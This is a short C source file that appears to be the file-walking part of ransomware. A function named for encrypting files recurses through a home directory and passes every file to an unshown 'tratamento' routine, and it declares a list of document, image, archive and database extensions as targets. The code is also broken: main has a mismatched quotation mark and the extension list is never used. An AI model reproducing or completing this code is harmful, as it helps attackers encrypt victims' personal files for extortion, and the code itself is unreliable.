#include <stdio.h>
#include <dirent.h>
#include <sys/types.h>
#include <string.h>
#include "tr_file.h"

#define _LARGEFILE_SOURCE _
#define FILE_OFFSET_BITS 64

void arquivos_encryptar(char *diretorio){

        char path[1500];
        char path2[1500];
        struct dirent *dp;
        DIR *dir = opendir(diretorio);

        char *dados[20];

        dados[0] = ".xlms";
        dados[1] = ".jpg";
        dados[2] = ".jpeg";
        dados[3] = ".txt";
        dados[4] = ".doc";
        dados[5] = ".mp4";
        dados[6] = ".png";
        dados[7] = ".docx";
        dados[8] = ".pdf";
        dados[9] = ".wmv";
        dados[10] = ".avi";
        dados[11] = ".ppt";
        dados[12] = ".pptx";
        dados[13] = ".sql";
        dados[14] = ".zip";
        dados[15] = ".rar";
        dados[16] = ".7z";



        if(!dir)
                return;
        while((dp = readdir(dir)) != NULL){
                if(strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0){
                        strcpy(path, diretorio);
                        if(dp->d_type == DT_DIR){
                                strcat(path, dp->d_name);
                                strcat(path, "/");
                                puts(path);
                                arquivos_encryptar(path);
                        }else{
                                strcpy(path2, path);
                                strcat(path2, dp->d_name);
                                if(!(tratamento(path2))){
                                        puts("error");
                                        }
                                }
                        }

                }
closedir(dir);
}



int main(void){

        arquivos_encryptar("/home/"user");

return 0;
}
